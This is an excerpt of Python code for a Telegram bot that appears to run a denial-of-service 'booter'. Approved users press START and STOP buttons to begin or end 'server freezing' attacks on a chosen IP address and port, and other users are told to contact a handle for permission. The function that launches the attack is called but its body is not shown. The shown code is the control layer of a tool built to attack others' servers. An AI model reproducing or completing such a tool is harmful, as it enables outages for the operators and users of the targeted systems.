...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗟𝗘𝗟𝗘 --> @VimPixss 🥷*", parse_mode='Markdown')

def send_main_buttons(chat_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("𝗙𝗥𝗘𝗘𝗭𝗘 ❄️"), KeyboardButton("𝐒𝐓𝐀𝐑𝐓 🟢"), KeyboardButton("𝐒𝐓𝐎𝐏 🔴"))
...
def approve_user(message):
    ...
    try:
        ...
        bot.send_message(message.chat.id, "*SHi SE ADD KAR NA*", parse_mode='Markdown')
...
def process_attack_ip_port(message):
    try:
        ...
        bot.send_message(message.chat.id, "*𝗖𝗛𝗢𝗧𝗜 𝗕𝗔𝗖𝗖𝗛𝗜 𝗛𝗢 𝗞𝗜𝗬𝗔 𝗦𝗔𝗠𝗔𝗝𝗛 𝗡𝗛𝗜 𝗔𝗔𝗧𝗔 😆*", parse_mode='Markdown')
        logging.error(f"Error in processing attack IP and port: {e}")

@bot.message_handler(func=lambda message: message.text == "𝐒𝐓𝐀𝐑𝐓 🟢")
def start_attack(message):
    ...
    if attack_details:
        ...
        bot.send_message(message.chat.id, f"*𝗦𝗘𝗥𝗩𝗘𝗥 𝗙𝗥𝗘𝗘𝗭𝗜𝗡𝗚 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ✅: {target_ip} 𝗣𝗢𝗥𝗧: {target_port}*", parse_mode='Markdown')
    else:
        bot.send_message(message.chat.id, "*No Target Specified. Use /attack To Set it Up.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "𝐒𝐓𝐎𝐏 🔴")
def stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if attack_details:
        target_ip, target_port = attack_details
        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
        bot.send_message(message.chat.id, f"*𝗦𝗘𝗥𝗩𝗘𝗥 𝗙𝗥𝗘𝗘𝗭𝗜𝗡𝗚 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ⏸️: {target_ip} 𝗣𝗢𝗥𝗧: {target_port}*", parse_mode='Markdown')
        user_attack_details.pop(message.from_user.id, None)
    else:
        bot.send_message(message.chat.id, "*𝗞𝗢𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗡𝗛𝗜 𝗠𝗜𝗟𝗔 𝗦𝗧𝗢𝗣 𝗞𝗔𝗥𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 𝗝𝗢𝗜𝗡 --> @VimPix_BOLTE ❤️.*", parse_mode='Markdown')
